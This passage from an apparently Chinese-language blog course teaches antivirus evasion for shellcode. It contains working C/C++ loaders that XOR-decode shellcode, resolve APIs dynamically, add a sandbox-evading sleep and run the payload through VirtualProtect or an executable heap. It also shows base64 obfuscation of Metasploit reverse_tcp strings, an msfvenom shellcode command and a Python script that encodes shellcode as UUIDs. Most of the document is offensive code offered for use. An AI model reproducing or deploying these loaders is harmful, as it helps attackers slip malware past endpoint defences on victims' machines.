class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;intrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;WinBase.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">LPVOID</span><span class="params">(WINAPI* ImportVirtualAlloc)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">LPVOID lpAddress,</span></span></span><br><span class="line"><span class="function"><span class="params">SIZE_T dwSize,</span></span></span><br><span class="line"><span class="function"><span class="params">DWORD  flAllocationType,</span></span></span><br><span class="line"><span class="function"><span class="params">DWORD  flProtect</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">HANDLE</span><span class="params">(WINAPI* ImportCreateThread)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">LPSECURITY_ATTRIBUTES   lpThreadAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">SIZE_T                  dwStackSize,</span></span></span><br><span class="line"><span class="function"><span class="params">LPTHREAD_START_ROUTINE  lpStartAddress,</span></span></span><br><span class="line"><span class="function"><span class="params">__drv_aliasesMem LPVOID lpParameter,</span></span></span><br><span class="line"><span class="function"><span class="params">DWORD                   dwCreationFlags,</span></span></span><br><span class="line"><span class="function"><span class="params">LPDWORD                 lpThreadId)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span><span class="params">(WINAPI* ImportVirtualProtect)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">LPVOID lpAddress,</span></span></span><br><span class="line"><span class="function"><span class="params">SIZE_T dwSize,</span></span></span><br><span class="line"><span class="function"><span class="params">DWORD  flNewProtect,</span></span></span><br><span class="line"><span class="function"><span class="params">PDWORD lpflOldProtect</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* ImportWaitForSingleObject)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">HANDLE hHandle,</span></span></span><br><span class="line"><span class="function"><span class="params">DWORD  dwMilliseconds</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 入口函数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">wmain</span><span class="params">(<span class="keyword">int</span> argc, TCHAR* argv[])</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">ImportVirtualAlloc MyVirtualAlloc = (ImportVirtualAlloc)GetProcAddress(GetModuleHandle(TEXT(<span class="string">&quot;kernel32.dll&quot;</span>)), <span class="string">&quot;VirtualAlloc&quot;</span>);</span><br><span class="line">ImportCreateThread MyCreateThread = (ImportCreateThread)GetProcAddress(GetModuleHandle(TEXT(<span class="string">&quot;kernel32.dll&quot;</span>)), <span class="string">&quot;CreateThread&quot;</span>);</span><br><span class="line">ImportVirtualProtect MyVirtualProtect = (ImportVirtualProtect)GetProcAddress(GetModuleHandle(TEXT(<span class="string">&quot;kernel32.dll&quot;</span>)), <span class="string">&quot;VirtualProtect&quot;</span>);</span><br><span class="line">ImportWaitForSingleObject MyWaitForSingleObject = (ImportWaitForSingleObject)GetProcAddress(GetModuleHandle(TEXT(<span class="string">&quot;kernel32.dll&quot;</span>)), <span class="string">&quot;WaitForSingleObject&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> shellcode_size = <span class="number">0</span>; <span class="comment">// shellcode长度</span></span><br><span class="line">DWORD dwThreadId; <span class="comment">// 线程ID</span></span><br><span class="line">HANDLE hThread; <span class="comment">// 线程句柄</span></span><br><span class="line">DWORD dwOldProtect; <span class="comment">// 内存页属性</span></span><br><span class="line"><span class="comment">/* length: 800 bytes */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buf[] = <span class="string">&quot;\xf6\xe2\x83\x0a\x0a\x0a\x6a...&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取shellcode大小</span></span><br><span class="line">shellcode_size = <span class="keyword">sizeof</span>(buf);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 增加异或代码 */</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; shellcode_size; i++) &#123;</span><br><span class="line"><span class="comment">//Sleep(50);</span></span><br><span class="line">_InterlockedXor8(buf + i, <span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">VirtualAlloc(</span></span><br><span class="line"><span class="comment">NULL, // 基址</span></span><br><span class="line"><span class="comment">800,  // 大小</span></span><br><span class="line"><span class="comment">MEM_COMMIT, // 内存页状态</span></span><br><span class="line"><span class="comment">PAGE_EXECUTE_READWRITE // 可读可写可执行</span></span><br><span class="line"><span class="comment">);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span>* shellcode = (<span class="keyword">char</span>*)MyVirtualAlloc(</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">shellcode_size,</span><br><span class="line">MEM_COMMIT,</span><br><span class="line">PAGE_READWRITE <span class="comment">// 只申请可读可写</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将shellcode复制到可读可写的内存页中</span></span><br><span class="line">CopyMemory(shellcode, buf, shellcode_size);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这里开始更改它的属性为可执行</span></span><br><span class="line">MyVirtualProtect(shellcode, shellcode_size, PAGE_EXECUTE, &amp;dwOldProtect);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等待几秒，兴许可以跳过某些沙盒呢？</span></span><br><span class="line">Sleep(<span class="number">2000</span>);</span><br><span class="line"></span><br><span class="line">hThread = MyCreateThread(</span><br><span class="line"><span class="literal">NULL</span>, <span class="comment">// 安全描述符</span></span><br><span class="line"><span class="literal">NULL</span>, <span class="comment">// 栈的大小</span></span><br><span class="line">(LPTHREAD_START_ROUTINE)shellcode, <span class="comment">// 函数</span></span><br><span class="line"><span class="literal">NULL</span>, <span class="comment">// 参数</span></span><br><span class="line"><span class="literal">NULL</span>, <span class="comment">// 线程标志</span></span><br><span class="line">&amp;dwThreadId <span class="comment">// 线程ID</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">MyWaitForSingleObject(hThread, INFINITE); <span class="comment">// 一直等待线程执行结束</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210220162832.png"></p><h1 id="第八课"><a href="#第八课" class="headerlink" title="第八课"></a>第八课</h1><h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><p>一般情况下，C/C++程序中的<strong>字符串常量会被硬编码到程序中（.data段，也就是数据段）</strong>，尤其是全局变量最容易被定位到。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> global_string[] = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s \n&quot;</span>, global_string);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果编写的是一些敏感参数的工具，很容易会被提取出特征，例如lcx这款工具，它的参数如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[Usage of Packet Transmit:]</span><br><span class="line"></span><br><span class="line">lcx -&lt;listen|tran|slave&gt; &lt;option&gt; [-log logfile]</span><br><span class="line"></span><br><span class="line">[option:]</span><br><span class="line"></span><br><span class="line"> -listen &lt;ConnectPort&gt; &lt;TransmitPort&gt;</span><br><span class="line"> -tran&lt;ConnectPort&gt; &lt;TransmitHost&gt; &lt;TransmitPort&gt;</span><br><span class="line"> -slave &lt;ConnectHost&gt; &lt;ConnectPort&gt; &lt;TransmitHost&gt;&lt;TransmitPort&gt;</span><br></pre></td></tr></table></figure><p>其中，<code>-listen</code>、<code>-tran</code>、<code>-slave</code>非常敏感，一般常见程序不会高频使用这些参数名，因此落地被杀也是意料之中。</p><h2 id="C-重载运算符"><a href="#C-重载运算符" class="headerlink" title="C++ 重载运算符"></a>C++ 重载运算符</h2><p>C++ 允许在同一作用域中的某个函数和运算符指定多个定义，分别称为函数重载和运算符重载。</p><p>重载的运算符是带有特殊名称的函数，函数名是由关键字 operator 和其后要重载的运算符符号构成的。与其他函数一样，重载运算符有一个返回类型和一个参数列表。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BadString</span> &#123;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">DWORD dwStrLength = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> szOutStr;</span><br><span class="line"><span class="function"><span class="built_in">std</span>::<span class="built_in">string</span> <span class="title">Base64decode</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">string</span> szBase64String, LPDWORD lpdwLen)</span></span>;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">BadString(<span class="built_in">std</span>::<span class="built_in">string</span> szInStr);</span><br><span class="line"><span class="function"><span class="keyword">operator</span> <span class="title">std::string</span><span class="params">()</span></span>;</span><br><span class="line">~BadString();</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#include &quot;BadString.h&quot;</span></span><br><span class="line"></span><br><span class="line">std::string BadString::Base64decode(std::string szBase64String, LPDWORD lpdwLen)</span><br><span class="line">&#123;</span><br><span class="line">DWORD dwLen;</span><br><span class="line">DWORD dwNeed;</span><br><span class="line">PBYTE lpBuffer = NULL;</span><br><span class="line">dwLen = szBase64String.length();</span><br><span class="line">dwNeed = <span class="number">0</span>;</span><br><span class="line">CryptStringToBinaryA(szBase64String.c_str(), <span class="number">0</span>, CRYPT_STRING_BASE64, NULL, &amp;dwNeed, NULL, NULL);</span><br><span class="line"><span class="keyword">if</span> (dwNeed)</span><br><span class="line">&#123;</span><br><span class="line">lpBuffer = <span class="keyword">new</span> BYTE[dwNeed + <span class="number">1</span>];</span><br><span class="line">ZeroMemory(lpBuffer, dwNeed + <span class="number">1</span>);</span><br><span class="line">CryptStringToBinaryA(szBase64String.c_str(), <span class="number">0</span>, CRYPT_STRING_BASE64, lpBuffer, &amp;dwNeed, NULL, NULL);</span><br><span class="line">*lpdwLen = dwNeed;</span><br><span class="line">&#125;</span><br><span class="line">return std::string((PCHAR)lpBuffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BadString::BadString(std::string szInStr)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>-&gt;dwStrLength = szInStr.length();</span><br><span class="line"><span class="keyword">this</span>-&gt;szOutStr = <span class="keyword">this</span>-&gt;Base64decode(szInStr, &amp;<span class="keyword">this</span>-&gt;dwStrLength);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BadString::operator std::string()</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">this</span>-&gt;szOutStr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BadString::~BadString()</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用方式：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;BadString.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">string</span>(BadString(<span class="string">&quot;SGVsbG8gV29ybGQK&quot;</span>)) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>假设一个功能函数的定义如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CCooolisMetasploit::SendPayload</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">string</span> options, <span class="built_in">std</span>::<span class="built_in">string</span> payload)</span></span></span><br></pre></td></tr></table></figure><p>那么，调用这个函数时，传递的<code>std::string options</code>这个字符串可能会被定位，这个时候需要在传入之前调用一个函数，进行一次解密，把解密后的字符串传入。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">metasploit-&gt;add_option(CooolisString(&quot;LXAsLS1wYXlsb2Fk&quot;), msf_payload, CooolisString(&quot;UGF5bG9hZCBOYW1lLCBlLmcuIHdpbmRvd3MvbWV0ZXJwcmV0ZXIvcmV2ZXJzZV90Y3A&#x3D;&quot;))-&gt;default_str(CooolisString(&quot;d2luZG93cy9tZXRlcnByZXRlci9yZXZlcnNlX3RjcA&#x3D;&#x3D;&quot;));</span><br></pre></td></tr></table></figure><h1 id="第九课"><a href="#第九课" class="headerlink" title="第九课"></a>第九课</h1><h2 id="数据执行保护（DEP）"><a href="#数据执行保护（DEP）" class="headerlink" title="数据执行保护（DEP）"></a>数据执行保护（DEP）</h2><p>DEP(Data Execution Prevention)即“ 数据执行保护”，这是Windows的一项安全机制，主要用来防止病毒和其他安全威胁对系统造成破坏。 <strong>微软从Windows XP SP2引入了该技术，并一直延续到今天。</strong></p><hr><p>为什么要有DEP：</p><p>在Windows Xp SP2 之前的时代，缓冲区溢出漏洞利用门槛太低了，只要发现有缓冲区溢出漏洞，就可以直接稳定利用，攻击者只需要将Shellcode不断写入堆栈，然后覆盖函数返回地址，代码就可以在堆栈中执行。但堆栈的用途主要是保存寄存器现场，提供一个函数运行时的存储空间，极少数需要代码在堆栈中执行，于是微软为了缓解类似的情况，发明了DEP保护机制，用于限<strong>制某些内存页不具有可执行权限。</strong></p><h2 id="如何绕过DEP"><a href="#如何绕过DEP" class="headerlink" title="如何绕过DEP"></a>如何绕过DEP</h2><p><code>VirtualProtect</code>这个API能够更改内存页的属性为可执行或不可执行，对于二进制漏洞利用来说，溢出的时候，把返回地址设计为<code>VirtualProtect</code>的地址，再精心构造一个栈为调用这个API的栈，就可以改变当前栈的内存页的属性，使其从”不可执行”变成”可执行”。</p><h2 id="举一反三"><a href="#举一反三" class="headerlink" title="举一反三"></a>举一反三</h2><p>Shellcode执行其实也需要一个可执行的内存页，那么还有哪些API能够构造一个可执行的内存页呢？</p><p><code>HeapCreate</code>可以在进程中创建辅助堆栈，并且能够设置堆栈的属性：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE WINAPI <span class="title">HeapCreate</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">__in DWORD flOptions,</span></span></span><br><span class="line"><span class="function"><span class="params">__in SIZE_T dwInitialSize,</span></span></span><br><span class="line"><span class="function"><span class="params">__in SIZE_T dwMaximumSize )</span></span>;</span><br></pre></td></tr></table></figure><p>第一个参数<code>flOptions</code>用于修改如何在堆栈上执行各种操作。 你可以设定<code>0</code>、<code>HEAP_NO_SERIALIZE</code>、<code>HEAP_GENERATE_EXCEPTIONS</code>、<code>HEAP_CREATE_ENABLE_EXECUTE</code>或者是这些标志的组合。</p><ul><li><code>HEAP_NO_SERIALIZE</code>：对堆的访问是非独占的，如果一个线程没有完成对堆的操作，其它线程也可以进程堆操作，这个开关是非常危险的，应尽量避免使用。</li><li><code>HEAP_GENERATE_EXCEPTIONS</code>：当堆分配内存失败时，会抛出异常。如果不设置，则返回NULL。</li><li><code>HEAP_CREATE_ENALBE_EXECUTE</code>：堆中存放的内容是可以执行的代码。如果不设置，意味着堆中存放的是不可执行的数据。</li></ul><p>看到<code>HEAP_CREATE_ENALBE_EXECUTE</code>相信很多人能够恍然大悟，我们的Shellcode可以存入这个辅助堆栈中，然后创建一个线程运行它即可。</p><h2 id="Shellcode-执行"><a href="#Shellcode-执行" class="headerlink" title="Shellcode 执行"></a>Shellcode 执行</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> shellcode[] = <span class="string">&quot;123&quot;</span>;</span><br><span class="line"></span><br><span class="line">HANDLE hHep = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE | HEAP_ZERO_MEMORY, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">PVOID Mptr = HeapAlloc(hHep, <span class="number">0</span>, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line"></span><br><span class="line">RtlCopyMemory(Mptr, shellcode, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line">DWORD dwThreadId = <span class="number">0</span>;</span><br><span class="line">HANDLE hThread = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, (LPTHREAD_START_ROUTINE)Mptr, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;dwThreadId);</span><br><span class="line">WaitForSingleObject(hThread, INFINITE);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Hello World!\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="第十课"><a href="#第十课" class="headerlink" title="第十课"></a>第十课</h1><h2 id="UUID"><a href="#UUID" class="headerlink" title="UUID"></a>UUID</h2><p>通用唯一标识符（universally unique identifier, UUID）是一个128位的用于在计算机系统中以识别信息的数目。在Windows中也有使用GUID来标识唯一对象。 </p><p>Windows中的GUID 等同于 UUID, 其结构：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">GUID</span> &#123;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span>  Data1; <span class="comment">// 4字节</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> Data2; <span class="comment">// 2字节</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> Data3; <span class="comment">// 2字节</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span>  Data4[<span class="number">8</span>]; <span class="comment">// 8字节</span></span><br><span class="line">&#125; GUID;</span><br></pre></td></tr></table></figure><p>总和一共16字节，16*8 = 128位。</p><h2 id="与uuid-相关的Windows-API"><a href="#与uuid-相关的Windows-API" class="headerlink" title="与uuid 相关的Windows API"></a>与uuid 相关的Windows API</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">RPC_STATUS <span class="title">UuidFromString</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  RPC_CSTR StringUuid,</span></span></span><br><span class="line"><span class="function"><span class="params">  UUID     *Uuid</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><p>功能：将字符串uuid转换为uuid结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">RPC_STATUS <span class="title">UuidCreate</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  UUID *Uuid</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><p>功能：创建UUID结构。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">UuidEqual</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  UUID       *Uuid1,</span></span></span><br><span class="line"><span class="function"><span class="params">  UUID       *Uuid2,</span></span></span><br><span class="line"><span class="function"><span class="params">  RPC_STATUS *Status</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><p>功能：判断两个UUID是否相等。</p><p>UUID 代表了 -&gt; <code>typedef GUID UUID;</code></p><h2 id="uuid-测试"><a href="#uuid-测试" class="headerlink" title="uuid 测试"></a>uuid 测试</h2><p>生成 shellcode</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;msfvenom -p windows&#x2F;exec CMD&#x3D;calc.exe -b &#39;\xfc\xe8&#39; -f raw -o &#x2F;tmp&#x2F;shellcode.bin</span><br></pre></td></tr></table></figure><p>bin2uuid</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> uuid <span class="keyword">import</span> UUID</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># Usage: python3 binToUUIDs.py shellcode.bin [--print]</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">  ____  _    _______    _    _ _    _ _____ _____       </span></span><br><span class="line"><span class="string"> |  _ \(_)  |__   __|  | |  | | |  | |_   _|  __ \      </span></span><br><span class="line"><span class="string"> | |_) |_ _ __ | | ___ | |  | | |  | | | | | |  | |___  </span></span><br><span class="line"><span class="string"> |  _ &lt;| | &#x27;_ \| |/ _ \| |  | | |  | | | | | |  | / __| </span></span><br><span class="line"><span class="string"> | |_) | | | | | | (_) | |__| | |__| |_| |_| |__| \__ \ </span></span><br><span class="line"><span class="string"> |____/|_|_| |_|_|\___/ \____/ \____/|_____|_____/|___/</span></span><br><span class="line"><span class="string">\n&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(sys.argv[<span class="number">1</span>], <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    bin = f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">2</span> <span class="keyword">and</span> sys.argv[<span class="number">2</span>] == <span class="string">&quot;--print&quot;</span>:</span><br><span class="line">    outputMapping = <span class="literal">True</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    outputMapping = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">offset = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;Length of shellcode: &#123;&#125; bytes\n&quot;</span>.format(len(bin)))</span><br><span class="line"></span><br><span class="line">out = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(offset &lt; len(bin)):</span><br><span class="line">    countOfBytesToConvert = len(bin[offset:])</span><br><span class="line">    <span class="keyword">if</span> countOfBytesToConvert &lt; <span class="number">16</span>:</span><br><span class="line">        ZerosToAdd = <span class="number">16</span> - countOfBytesToConvert</span><br><span class="line">        byteString = bin[offset:] + (<span class="string">b&#x27;\x00&#x27;</span>* ZerosToAdd)</span><br><span class="line">        uuid = UUID(bytes_le=byteString)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        byteString = bin[offset:offset+<span class="number">16</span>]</span><br><span class="line">        uuid = 